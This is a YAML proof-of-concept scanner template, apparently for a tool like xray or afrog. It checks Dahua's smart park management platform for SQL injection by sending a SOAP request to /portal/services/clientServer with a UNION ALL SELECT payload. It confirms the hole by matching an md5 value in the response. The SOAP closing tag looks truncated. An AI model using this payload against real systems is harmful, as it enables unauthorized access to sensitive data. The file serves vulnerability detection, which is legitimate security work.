id: dahua-smartpark-sql-inject
info:
  name: 大华智慧园区综合管理平台SQL注入
  author: laohuan12138
  severity: high
  verified: true
  description: |-
    大华智慧园区综合管理平台clientServer接口处未对用户的输入进行过滤，存在sql注入，可获取敏感信息。
  reference:
    - https://mp.weixin.qq.com/s/JzQ0duMAavWYt6suX_MFqg
  tags: dahua,sql
  created: 2024/04/08

set:
  num: randomInt(100000, 999999)

rules:
  r0:
    request:
      method: POST
      path: /portal/services/clientServer
      headers:
        Content-Type: text/xml;charset=UTF-8
      body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
        <soapenv:Header/>
        <soapenv:Body>
        <cli:getGroupInfoListByGroupId>
        <!--type: string-->
        <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5({{num}})-- -</arg0>
        <!--type: long-->
        <arg1>10</arg1>
        </cli:getGroupInfoListByGroupId>
        </soapenv:Body>
        </soapenv:
    expression: response.status == 200 && response.body.bcontains(b"groupdetail") && response.body.bcontains(bytes(md5(string(num))))

expression: r0()
